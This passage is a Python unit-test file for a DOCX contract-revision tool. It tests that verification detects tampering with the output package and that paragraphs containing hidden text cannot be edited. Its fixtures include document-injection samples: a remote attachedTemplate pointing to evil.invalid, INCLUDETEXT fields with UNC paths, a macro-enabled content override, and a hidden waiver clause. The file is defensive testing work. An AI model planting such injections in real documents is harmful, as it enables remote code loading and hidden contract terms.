        base = build_docx_bytes(p(r("正文。")))
        path = self.path("dupzip.docx")
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            with zipfile.ZipFile(path, "w") as zf:
                with zipfile.ZipFile(io.BytesIO(base)) as src:
                    for info in src.infolist():
                        zf.writestr(info, src.read(info))
                zf.writestr("word/document.xml", b"<broken>")
        code, payload, _ = self.plan(
            path,
            [{"id": "R1", "para": "RL0001", "old": "正文", "new": "新正文",
              "reason": "x"}],
        )
        self.assertEqual(code, 2, payload)
        self.assertIn("重复", payload["error"])

    def test_zip_size_limits(self):
        docx = self.write("big.docx", p(r("正文。")))
        with mock.patch.object(cr, "MAX_PART_BYTES", 64):
            code, payload = self.json_cli("inspect", docx)
        self.assertEqual(code, 2, payload)
        with mock.patch.object(cr, "MAX_PART_BYTES", 10 ** 9), mock.patch.object(
            cr, "MAX_TOTAL_UNCOMPRESSED", 64
        ):
            code, payload = self.json_cli("inspect", docx)
        self.assertEqual(code, 2, payload)


class TestCliHetong(Base):
    def test_help_documents_formats(self):
        code, out, err = self.cli("--help")
        self.assertEqual(code, 0)
        for token in ("inspect", "plan", "apply", "verify", "edits.json",
                      "RL0001", "reason", "broad_reason", "退出码"):
            self.assertIn(token, out)

    def test_plan_writes_only_plan(self):
        docx = self.write("only.docx", p(r("金额100元。")))
        code, plan, plan_path = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "100", "new": "200",
              "reason": "调整"}],
        )
        self.assertEqual(code, 0, plan)
        names = sorted(os.listdir(self.tmp))
        self.assertEqual(names, ["edits.json", "only.docx", "plan.json"])
        self.assertEqual(plan["source_sha256"], cr.sha256_file(docx))
        self.assertEqual(plan["fingerprint"]["algorithm"], "sha256")


class TestNamespaceAndRunFidelity(Base):
    def test_existing_comments_use_their_own_prefix(self):
        comments = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            f'<ns0:comments xmlns:ns0="{W_NS}">'
            '<ns0:comment ns0:id="4" ns0:author="旧" '
            'ns0:date="2024-01-01T00:00:00Z">'
            "<ns0:p><ns0:r><ns0:t>旧批注</ns0:t></ns0:r></ns0:p>"
            "</ns0:comment></ns0:comments>"
        )
        body = (
            p(
                '<w:commentRangeStart w:id="4"/>', r("保留"),
                '<w:commentRangeEnd w:id="4"/>',
                '<w:r><w:rPr><w:rStyle w:val="CommentReference"/></w:rPr>'
                '<w:commentReference w:id="4"/></w:r>',
            )
            + p(r("金额100元。"))
        )
        docx = self.write(
            "prefix.docx", body, extras={"word/comments.xml": comments}
        )
        code, plan, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0002", "old": "100", "new": "200",
              "reason": "调整"}],
        )
        self.assertEqual(code, 0, plan)
        code, payload = self.apply(docx, out="out.docx")
        self.assertEqual(code, 0, payload)
        comments_bytes = self.read_docx_part(
            self.path("out.docx"), "word/comments.xml"
        )
        # 追加内容必须继承 ns0 前缀，不能出现未绑定的 w:
        self.assertIn(b"<ns0:comment ns0:id=\"5\"", comments_bytes)
        self.assertNotIn(b"<w:comment", comments_bytes)
        cr.parse_xml(comments_bytes, "word/comments.xml")
        code, report = self.verify(docx, result="out.docx")
        self.assertEqual(code, 0, report)

    def test_empty_run_and_mid_run_comment_anchor(self):
        body = p(
            r("甲乙"),
            '<w:r><w:rPr><w:i/></w:rPr></w:r>',
            r("丙丁戊"),
        )
        docx = self.write("emptyrun.docx", body)
        code, plan, _ = self.plan(
            docx,
            [{"id": "C1", "para": "RL0001", "old": "丙丁",
              "comment": "请确认"}],
        )
        self.assertEqual(code, 0, plan)
        code, payload = self.apply(docx, out="out.docx")
        self.assertEqual(code, 0, payload)
        xml = self.read_docx_part(self.path("out.docx"))
        # 批注范围精确切在 run 内部，且空 run 仍保留
        self.assertIn(b"<w:i/>", xml)
        self.assertIn("丙丁".encode(), xml)
        code, report = self.verify(docx, result="out.docx")
        self.assertEqual(code, 0, report)
        self.assertTrue(report["checks"]["reject_equals_baseline"])

    def test_batch_multiple_paragraphs(self):
        body = p(r("金额100元。")) + p(r("期限三十日。"))
        docx = self.write("batchok.docx", body)
        code, plan, _ = self.plan(
            docx,
            [
                {"id": "R1", "para": "RL0001", "old": "100", "new": "200",
                 "reason": "调价"},
                {"id": "C2", "para": "RL0002", "old": "三十日",
                 "comment": "请确认期限"},
            ],
        )
        self.assertEqual(code, 0, plan)
        self.assertEqual(len(plan["ops"]), 2)
        code, payload = self.apply(docx, out="out.docx")
        self.assertEqual(code, 0, payload)
        code, report = self.verify(docx, result="out.docx")
        self.assertEqual(code, 0, report)
        self.assertEqual(report["new_comments"]["count"], 2)
        self.assertEqual(report["new_revisions"]["ids"], ["1", "2"])


class TestVerifyStructuralTampering(Base):
    def _rewrite_member(self, src, dest, name, transform):
        with zipfile.ZipFile(src) as zin:
            infos = zin.infolist()
            data = {i.filename: zin.read(i) for i in infos}
        data[name] = transform(data[name])
        with zipfile.ZipFile(dest, "w") as zout:
            for info in infos:
                zout.writestr(info, data[info.filename])

    def _base_with_existing(self):
        body = (
            p(
                r("前"),
                '<w:ins w:id="7" w:author="旧" '
                'w:date="2024-01-01T00:00:00Z">' + r("原有插入") + "</w:ins>",
            )
            + p(
                '<w:commentRangeStart w:id="4"/>', r("保留批注锚"),
                '<w:commentRangeEnd w:id="4"/>',
                '<w:r><w:rPr><w:rStyle w:val="CommentReference"/></w:rPr>'
                '<w:commentReference w:id="4"/></w:r>',
            )
            + p(r("金额100元。"))
        )
        docx = self.write(
            "existing.docx", body, extras={"word/comments.xml": COMMENTS_PART}
        )
        code, plan, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0003", "old": "100", "new": "200",
              "reason": "调整"}],
        )
        self.assertEqual(code, 0, plan)
        code, payload = self.apply(docx, out="out.docx")
        self.assertEqual(code, 0, payload)
        return docx

    def test_removed_existing_anchor_detected(self):
        docx = self._base_with_existing()
        self._rewrite_member(
            self.path("out.docx"),
            self.path("t1.docx"),
            "word/document.xml",
            lambda b: b.replace(b'<w:commentRangeStart w:id="4"/>', b""),
        )
        code, payload = self.verify(docx, result="t1.docx")
        self.assertEqual(code, 3, payload)
        checks = payload["detail"]["report"]["checks"]
        self.assertFalse(checks["existing_comment_anchors_preserved"])

    def test_removed_existing_revision_detected(self):
        docx = self._base_with_existing()
        self._rewrite_member(
            self.path("out.docx"),
            self.path("t2.docx"),
            "word/document.xml",
            lambda b: re.sub(
                rb'<w:ins w:id="7".*?</w:ins>', b"", b, flags=re.S
            ),
        )
        code, payload = self.verify(docx, result="t2.docx")
        self.assertEqual(code, 3, payload)
        checks = payload["detail"]["report"]["checks"]
        self.assertFalse(checks["existing_revisions_preserved"])

    def test_removed_relationship_detected(self):
        docx = self._base_with_existing()
        self._rewrite_member(
            self.path("out.docx"),
            self.path("t3.docx"),
            "word/_rels/document.xml.rels",
            lambda b: re.sub(
                rb'<Relationship Id="rId1".*?/>', b"", b, flags=re.S
            ),
        )
        code, payload = self.verify(docx, result="t3.docx")
        self.assertEqual(code, 3, payload)
        checks = payload["detail"]["report"]["checks"]
        self.assertFalse(checks["relationship_entries_preserved"])

    def test_table_row_revision_blocks_cell_edit(self):
        body = (
            '<w:tbl><w:tblPr/><w:tblGrid/><w:tr>'
            '<w:trPr><w:ins w:id="9" w:author="旧" '
            'w:date="2024-01-01T00:00:00Z"/></w:trPr>'
            "<w:tc><w:tcPr/>" + p(r("单价100元。")) + "</w:tc></w:tr></w:tbl>"
        )
        docx = self.write("rowrev.docx", body)
        code, payload, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "100", "new": "200",
              "reason": "x"}],
        )
        self.assertEqual(code, 1, payload)
        self.assertIn("不可编辑", payload["error"])


class TestAuthorizedPackageReconstruction(Base):
    """审计 P1-P5：结果必须是本生成器按 plan 精确重建的那个包。"""

    def _rewrite_member(self, src, dest, name, transform):
        with zipfile.ZipFile(src) as zin:
            infos = zin.infolist()
            data = {i.filename: zin.read(i) for i in infos}
        data[name] = transform(data[name])
        with zipfile.ZipFile(dest, "w") as zout:
            for info in infos:
                zout.writestr(info, data[info.filename])
        return dest

    def _base(self):
        body = (
            p(
                r("前"),
                '<w:ins w:id="7" w:author="旧" '
                'w:date="2024-01-01T00:00:00Z">' + r("原有插入") + "</w:ins>",
            )
            + p(
                '<w:commentRangeStart w:id="4"/>', r("保留批注锚"),
                '<w:commentRangeEnd w:id="4"/>',
                '<w:r><w:rPr><w:rStyle w:val="CommentReference"/></w:rPr>'
                '<w:commentReference w:id="4"/></w:r>',
            )
            + p(r("甲方应于2024年1月1日支付价款100000元。"))
            + p(r("乙方应在三十日内交付。"))
        )
        docx = self.write(
            "recon.docx", body, extras={"word/comments.xml": COMMENTS_PART}
        )
        code, plan, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0003", "old": "100000",
              "new": "200000", "reason": "调整价款"}],
        )
        self.assertEqual(code, 0, plan)
        code, payload = self.apply(docx, out="out.docx")
        self.assertEqual(code, 0, payload)
        return docx

    def _expect_detected(self, docx, transform, part="word/document.xml",
                         name="tampered.docx"):
        self._rewrite_member(
            self.path("out.docx"), self.path(name), part, transform
        )
        code, payload = self.verify(docx, result=name)
        self.assertEqual(code, 3, payload)
        checks = payload["detail"]["report"]["checks"]
        self.assertFalse(checks["rebuilt_package_matches"], checks)
        return checks

    def test_valid_result_passes_reconstruction(self):
        docx = self._base()
        code, report = self.verify(docx, result="out.docx")
        self.assertEqual(code, 0, report)
        self.assertTrue(all(report["checks"].values()), report["checks"])
        self.assertTrue(report["checks"]["rebuilt_package_matches"])
        self.assertTrue(report["checks"]["no_duplicate_change_ids"])
        self.assertTrue(
            any("重建" in note for note in report["notes"]), report["notes"]
        )

    def test_fld_simple_injection_detected(self):
        docx = self._base()
        self._expect_detected(
            docx,
            lambda b: b.replace(
                "价款".encode(),
                b'<w:fldSimple w:instr=" INCLUDETEXT &quot;\\\\srv\\x.docx&quot; "'
                b' w:dirty="true"/>' + "价款".encode(), 1),
            name="p1a.docx",
        )

    def test_complex_field_injection_detected(self):
        docx = self._base()
        field = (
            b'<w:r><w:fldChar w:fldCharType="begin" w:dirty="true"/></w:r>'
            b'<w:r><w:instrText xml:space="preserve"> INCLUDETEXT '
            b'&quot;\\\\srv\\x.docx&quot; </w:instrText></w:r>'
            b'<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
            b'<w:r><w:fldChar w:fldCharType="end"/></w:r>'
        )
        self._expect_detected(
            docx,
            lambda b: b.replace("价款".encode(), field + "价款".encode(), 1),
            name="p1b.docx",
        )

    def test_extra_existing_comment_anchor_detected(self):
        docx = self._base()
        self._expect_detected(
            docx,
            lambda b: b.replace(
                "价款".encode(),
                b'<w:commentRangeStart w:id="4"/>' + "价款".encode()
                + b'<w:commentRangeEnd w:id="4"/>', 1),
            name="p1c.docx",
        )

    def test_reused_revision_id_detected(self):
        docx = self._base()
        checks = self._expect_detected(
            docx,
            lambda b: b.replace(
                "价款".encode(),
                "价款".encode()
                + b'<w:del w:id="7" w:author="evil" '
                b'w:date="2024-01-01T00:00:00Z"><w:r><w:delText xml:space="preserve">'
                b'200000</w:delText></w:r></w:del>', 1),
            name="p1d.docx",
        )
        self.assertFalse(checks["no_duplicate_change_ids"], checks)

    def test_bookmark_injection_detected(self):
        docx = self._base()
        self._expect_detected(
            docx,
            lambda b: b.replace(
                "价款".encode(),
                b'<w:bookmarkStart w:id="0" w:name="inj"/>' + "价款".encode()
                + b'<w:bookmarkEnd w:id="0"/>', 1),
            name="p1e.docx",
        )

    def test_sectpr_removal_detected(self):
        docx = self._base()
        self._expect_detected(
            docx, lambda b: b.replace(b"<w:sectPr/>", b""), name="p2a.docx"
        )

    def test_sectpr_rewrite_detected(self):
        docx = self._base()
        self._expect_detected(
            docx,
            lambda b: b.replace(
                b"<w:sectPr/>",
                b'<w:sectPr><w:pgSz w:w="16838" w:h="11906" '
                b'w:orient="landscape"/><w:headerReference w:type="default" '
                b'r:id="rId1"/></w:sectPr>'),
            name="p2b.docx",
        )

    def test_altchunk_injection_detected(self):
        docx = self._base()
        self._expect_detected(
            docx,
            lambda b: b.replace(
                b"<w:sectPr/>", b'<w:altChunk r:id="rId99"/><w:sectPr/>'),
            name="p2c.docx",
        )

    def test_extra_external_relationship_detected(self):
        docx = self._base()
        self._expect_detected(
            docx,
            lambda b: b.replace(
                b"</Relationships>",
                b'<Relationship Id="rId99" Type="http://schemas.openxmlformats.org/'
                b'officeDocument/2006/relationships/attachedTemplate" '
                b'Target="https://evil.invalid/t.dotm" TargetMode="External"/>'
                b"</Relationships>"),
            part="word/_rels/document.xml.rels",
            name="p4a.docx",
        )

    def test_duplicate_rid_relationship_detected(self):
        docx = self._base()
        self._expect_detected(
            docx,
            lambda b: b.replace(
                b"</Relationships>",
                b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
                b'officeDocument/2006/relationships/attachedTemplate" '
                b'Target="https://evil.invalid/t.dotm" TargetMode="External"/>'
                b"</Relationships>"),
            part="word/_rels/document.xml.rels",
            name="p4b.docx",
        )

    def test_extra_content_type_override_detected(self):
        docx = self._base()
        self._expect_detected(
            docx,
            lambda b: b.replace(
                b"</Types>",
                b'<Override PartName="/word/injected.xml" ContentType="application/'
                b'vnd.ms-word.document.macroEnabled.main+xml"/></Types>'),
            part="[Content_Types].xml",
            name="p4c.docx",
        )

    def test_duplicate_comment_id_detected(self):
        docx = self._base()
        evil = (
            '<w:comment w:id="4" w:author="evil" w:date="2024-01-01T00:00:00Z">'
            "<w:p><w:r><w:t>恶意批注：本条已被放弃</w:t></w:r></w:p>"
            "</w:comment>"
        ).encode()
        checks = self._expect_detected(
            docx,
            lambda b: b.replace(b'<w:comment w:id="4"', evil + b'<w:comment w:id="4"', 1),
            part="word/comments.xml",
            name="p5.docx",
        )
        self.assertFalse(checks["no_duplicate_change_ids"], checks)

    def test_new_comment_date_must_be_unique(self):
        docx = self._base()

        def tamper(b):
            text = b.decode("utf-8")
            idx = text.find('<w:comment w:id="5"')
            self.assertGreater(idx, 0, text[-400:])
            end = text.find(">", idx)
            seg = re.sub(
                r'w:date="[^"]*"',
                'w:date="1999-12-31T23:59:59Z"',
                text[idx:end],
                count=1,
            )
            return (text[:idx] + seg + text[end:]).encode("utf-8")

        path = self._rewrite_member(
            self.path("out.docx"), self.path("p6.docx"),
            "word/comments.xml", tamper,
        )
        self.assertTrue(os.path.exists(path))
        code, payload = self.verify(docx, result="p6.docx")
        self.assertEqual(code, 3, payload)
        checks = payload["detail"]["report"]["checks"]
        self.assertFalse(checks["rebuilt_package_matches"])
        self.assertIn("date", payload["detail"]["report"]["errors"][0])

    def test_new_author_must_be_unique(self):
        docx = self._base()

        def tamper(b):
            text = b.decode("utf-8")
            idx = text.find('<w:comment w:id="5"')
            end = text.find(">", idx)
            seg = re.sub(
                r'w:author="[^"]*"', 'w:author="evil"',
                text[idx:end], count=1,
            )
            return (text[:idx] + seg + text[end:]).encode("utf-8")

        self._rewrite_member(
            self.path("out.docx"), self.path("p7.docx"),
            "word/comments.xml", tamper,
        )
        code, payload = self.verify(docx, result="p7.docx")
        self.assertEqual(code, 3, payload)
        report = payload["detail"]["report"]
        self.assertFalse(report["checks"]["rebuilt_package_matches"])
        self.assertTrue(
            any("author" in e for e in report["errors"]), report["errors"]
        )

    def test_extra_member_without_new_field_detected(self):
        docx = self._base()
        with zipfile.ZipFile(self.path("out.docx")) as zin:
            infos = zin.infolist()
            data = {i.filename: zin.read(i) for i in infos}
        data["word/injected.xml"] = b"<x/>"
        with zipfile.ZipFile(self.path("p8.docx"), "w") as zout:
            for info in infos:
                zout.writestr(info, data[info.filename])
            zout.writestr("word/injected.xml", b"<x/>")
        code, payload = self.verify(docx, result="p8.docx")
        self.assertEqual(code, 3, payload)
        checks = payload["detail"]["report"]["checks"]
        self.assertFalse(checks["zip_members_preserved"])
        self.assertFalse(checks["rebuilt_package_matches"])


class TestHiddenText(Base):
    def _body(self, rpr_xml, text="乙方放弃全部索赔权利。"):
        return p(
            f'<w:r>{rpr_xml}<w:t xml:space="preserve">{text}</w:t></w:r>'
        ) + p(r("本合同自双方签章之日起生效。"))

    def _hidden_edit(self):
        return [{"id": "R1", "para": "RL0001",
                 "old": "乙方放弃全部索赔权利。",
                 "new": "乙方在合理范围内承担责任。",
                 "reason": "删除弃权条款"}]

    def test_vanish_blocks_paragraph_and_plan(self):
        docx = self.write("vanish.docx", self._body("<w:rPr><w:vanish/></w:rPr>"))
        code, report = self.json_cli("inspect", docx)
        self.assertEqual(code, 0, report)
        first = report["paragraphs"][0]
        self.assertFalse(first["editable"])
        self.assertIn("hidden_text:vanish", first["blockers"])
        self.assertEqual(
            report["unsupported_structure_counts"]["hidden_text:vanish"], 1
        )
        self.assertTrue(
            any("hidden_text" in w for w in report["warnings"]),
            report["warnings"],
        )
        self.assertTrue(report["paragraphs"][1]["editable"])
        code, payload, plan_path = self.plan(
            docx, self._hidden_edit(), out="hidden-plan.json"
        )
        self.assertEqual(code, 1, payload)
        self.assertIn("不可编辑", payload["error"])
        self.assertFalse(os.path.exists(plan_path))

    def test_vanish_off_values_are_editable(self):
        for value in ("false", "0", "off"):
            docx = self.write(
                f"off-{value}.docx",
                self._body(f'<w:rPr><w:vanish w:val="{value}"/></w:rPr>'),
            )
            code, report = self.json_cli("inspect", docx)
            self.assertEqual(code, 0, report)
            self.assertTrue(report["paragraphs"][0]["editable"], value)
            code, plan, _ = self.plan(
                docx, self._hidden_edit(), out=f"off-{value}-plan.json"
            )
            self.assertEqual(code, 0, plan)
            code, payload = self.apply(
                docx, plan=f"off-{value}-plan.json",
                out=f"off-{value}-out.docx",
            )
            self.assertEqual(code, 0, payload)
            code, verify_report = self.verify(
                docx, result=f"off-{value}-out.docx",
                plan=f"off-{value}-plan.json",
            )
            self.assertEqual(code, 0, verify_report)

    def test_spec_vanish_and_web_hidden_blocked(self):
        for tag in ("specVanish", "webHidden"):
            docx = self.write(
                f"{tag}.docx", self._body(f"<w:rPr><w:{tag}/></w:rPr>")
            )
            code, report = self.json_cli("inspect", docx)
            self.assertEqual(code, 0, report)
            self.assertFalse(report["paragraphs"][0]["editable"], tag)
            self.assertIn(
                f"hidden_text:{tag}", report["paragraphs"][0]["blockers"]
            )
            code, payload, _ = self.plan(
                docx, self._hidden_edit(), out=f"{tag}-plan.json"
            )
            self.assertEqual(code, 1, payload)

    def test_style_inherited_hidden_text_boundary_disclosed(self):
        docx = self.write("styled-hidden.docx", p(r("正文。")))
        code, report = self.json_cli("inspect", docx)
        self.assertEqual(code, 0, report)
        warnings_text = " ".join(report["package"]["warnings"])
        self.assertIn("styles.xml", warnings_text)
        self.assertIn("隐藏", warnings_text)
        self.assertIn("未解析", warnings_text)

    def test_untouched_hidden_paragraph_does_not_block_other_edits(self):
        body = self._body("<w:rPr><w:vanish/></w:rPr>") + p(r("金额100元。"))
        docx = self.write("mixed.docx", body)
        code, report = self.json_cli("inspect", docx)
        self.assertEqual(code, 0, report)
        self.assertFalse(report["paragraphs"][0]["editable"])
        self.assertTrue(report["paragraphs"][2]["editable"])
        code, plan, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0003", "old": "100", "new": "200",
              "reason": "调整金额"}],
        )
        self.assertEqual(code, 0, plan)
        code, payload = self.apply(docx, out="mixed-out.docx")
        self.assertEqual(code, 0, payload)
        code, verify_report = self.verify(docx, result="mixed-out.docx")
        self.assertEqual(code, 0, verify_report)
        self.assertTrue(
            all(verify_report["checks"].values()), verify_report["checks"]
        )


class TestStrictNamespaceResolution(Base):
    _DEFAULT_NS_BODY = (
        '<p><r><t xml:space="preserve">金额为100元。</t></r></p>'
    )

    def _default_ns_docx(self, name, ns):
        return self.write_raw(
            name, build_default_ns_docx(self._DEFAULT_NS_BODY, ns)
        )

    def test_document_element_namespace_wins_over_added_prefix(self):
        path = self._default_ns_docx("strict-default.docx", STRICT_NS)
        pkg = cr.load_package(path)
        doc = cr.parse_xml(pkg.get("word/document.xml"), "word/document.xml")
        root = doc.documentElement
        if root is None:
            self.fail("documentElement 为空")
        self.assertEqual(root.namespaceURI, STRICT_NS)
        prefix, uri = cr.resolve_w_prefix(root)
        self.assertEqual(uri, STRICT_NS)
        self.assertEqual(prefix, "")
        # 不得为 Strict 文档补 transitional 的 xmlns:w 声明
        self.assertEqual(root.getAttribute("xmlns:w"), "")
        # 第二次调用不得被自加声明遮蔽
        self.assertEqual(cr.resolve_w_prefix(root)[1], STRICT_NS)

    def test_default_namespace_strict_rejected(self):
        path = self._default_ns_docx("strict-default2.docx", STRICT_NS)
        code, report = self.json_cli("inspect", path)
        self.assertEqual(code, 0, report)
        self.assertEqual(report["package"]["namespace"], STRICT_NS)
        self.assertFalse(report["package"]["safe_for_apply"])
        self.assertIn("Strict OOXML", " ".join(report["package"]["blockers"]))
        code, payload, plan_path = self.plan(
            path,
            [{"id": "R1", "para": "RL0001", "old": "100", "new": "200",
              "reason": "x"}],
            out="strict-default-plan.json",
        )
        self.assertEqual(code, 2, payload)
        self.assertIn("Strict OOXML", payload["error"])
        self.assertFalse(os.path.exists(plan_path))

    def test_prefixed_strict_rejected(self):
        docx = self.write("strict-prefixed.docx", p(r("正文100元。")), ns=STRICT_NS)
        code, report = self.json_cli("inspect", docx)
        self.assertEqual(code, 0, report)
        self.assertEqual(report["package"]["namespace"], STRICT_NS)
        self.assertFalse(report["package"]["safe_for_apply"])
        code, payload, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "100", "new": "200",
              "reason": "x"}],
            out="strict-prefixed-plan.json",
        )
        self.assertEqual(code, 2, payload)

    def test_default_namespace_transitional_still_supported(self):
        path = self._default_ns_docx("trans-default.docx", W_NS)
        code, report = self.json_cli("inspect", path)
        self.assertEqual(code, 0, report)
        self.assertEqual(report["package"]["namespace"], W_NS)
        self.assertTrue(report["package"]["safe_for_apply"], report["package"])
        self.assertTrue(report["paragraphs"][0]["editable"])
        code, plan, _ = self.plan(
            path,
            [{"id": "R1", "para": "RL0001", "old": "100", "new": "200",
              "reason": "调整金额"}],
            out="trans-plan.json",
        )
        self.assertEqual(code, 0, plan)
        code, payload = self.apply(
            path, plan="trans-plan.json", out="trans-out.docx"
        )
        self.assertEqual(code, 0, payload)
        result_xml = self.read_docx_part(self.path("trans-out.docx"))
        self.assertIn(b"<w:ins", result_xml)
        self.assertIn(b'xmlns:w="%s"' % W_NS.encode(), result_xml)
        code, verify_report = self.verify(
            path, result="trans-out.docx", plan="trans-plan.json"
        )
        self.assertEqual(code, 0, verify_report)
        self.assertTrue(
            all(verify_report["checks"].values()), verify_report["checks"]
        )


if __name__ == "__main__":
    unittest.main()
